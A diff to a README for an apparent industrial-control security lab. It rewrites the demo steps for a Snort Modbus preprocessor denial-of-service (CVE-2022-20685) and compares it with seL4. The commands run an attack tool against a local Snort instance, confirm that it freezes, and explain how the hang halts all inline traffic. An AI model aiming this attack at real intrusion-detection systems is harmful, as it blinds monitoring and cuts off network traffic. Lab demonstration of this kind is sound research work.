@@ -120,18 +120,29 @@ cd cve_tools && make
 
 ### CVE-2022-20685: Snort Modbus Preprocessor DoS
 
-Snort 2.9.18 has an integer overflow in its Modbus preprocessor. This demonstrates that IDS solutions themselves can be attacked:
+Snort 2.9.18 has an integer overflow in its Modbus preprocessor that causes an infinite loop, completely blocking all traffic through the IDS:
 
 ```bash
-# Blind the Snort IDS
+# 1. Verify Snort is working (should return Modbus response)
+echo -ne '\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01' | nc -w 2 localhost 503 | xxd
+
+# 2. Attack the Snort IDS
 ./cve_20685_attack 127.0.0.1 503
 
-# Now Snort is frozen - subsequent attacks go undetected
-./cve_14462_attack 127.0.0.1 503
+# 3. Verify Snort is frozen (should timeout with NO response)
+echo -ne '\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01' | nc -w 5 localhost 503 | xxd
 
-# seL4 is IMMUNE (no Modbus preprocessor to exploit)
-./cve_20685_attack 127.0.0.1 502  # No effect
+# 4. Check Snort CPU (should be 100%)
+sudo docker exec ics-snort top -b -n 1 | grep snort
+
+# 5. seL4 is IMMUNE (no Modbus preprocessor to exploit)
+./cve_20685_attack 127.0.0.1 502  # No effect on seL4
+
+# 6. Restart Snort after demo
+sudo docker compose restart snort
 ```
+
+**Why this is devastating:** Snort uses NFQUEUE inline mode, meaning packets are held in kernel queue until Snort returns a verdict. When Snort hangs, no verdicts are returned, and ALL traffic stops - not just IDS blindness, but complete denial of service.
 
 ### Full Comparison Experiment
 
